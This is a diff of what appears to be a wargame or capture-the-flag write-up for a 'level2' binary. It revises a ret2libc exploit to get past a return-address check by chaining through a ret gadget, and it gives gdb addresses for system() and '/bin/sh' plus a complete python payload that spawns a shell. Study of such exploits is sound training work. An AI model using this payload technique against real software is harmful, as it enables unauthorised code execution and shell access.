@@ -27,12 +27,14 @@ void main(void)
 }
 ```
 
-We can perform a ret2libc attack on this code (https://shellblade.net/files/docs/ret2libc.pdf)
+We can perform a kind of ret2libc attack on this code (https://shellblade.net/files/docs/ret2libc.pdf)
+
+Since there is a if checking that the return address is not coming from 0xb... memory, we bypass this protection by overflowing to a ret instruction (either main func or p func) and since a ret instruction pops the next address and jumps there, we follow it by system address with the correct parameter.
 
 Our payload should be like this : 
 
 ```
-[ padding ] + [ addr of ret instruction in p() ] + [ addr of system() ] + [ addr of exit() ] + [ addr of "/bin/sh" ]
+[ padding ] + [ addr of a ret ] + [ addr of system() ] + [ 4 bytes padding ] + [ addr of "/bin/sh" ]
 ```
 
 To find those address we can do in gdb :
@@ -54,6 +56,5 @@ exit() address : $2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>
 `"/bin/sh"` : (gdb) 0xb7f8cc58
 
 Our payload will look like this :
-`(python -c 'print("A"*80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" +  "\x58\xcc\xf8\xb7")'; cat) | ./level2`
-
+`(python -c 'print("\x90"* 80  + "\x4b\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\x90\x90\x90\x90" + "\x58\xcc\xf8\xb7")'; cat)`
 And we have a shell.
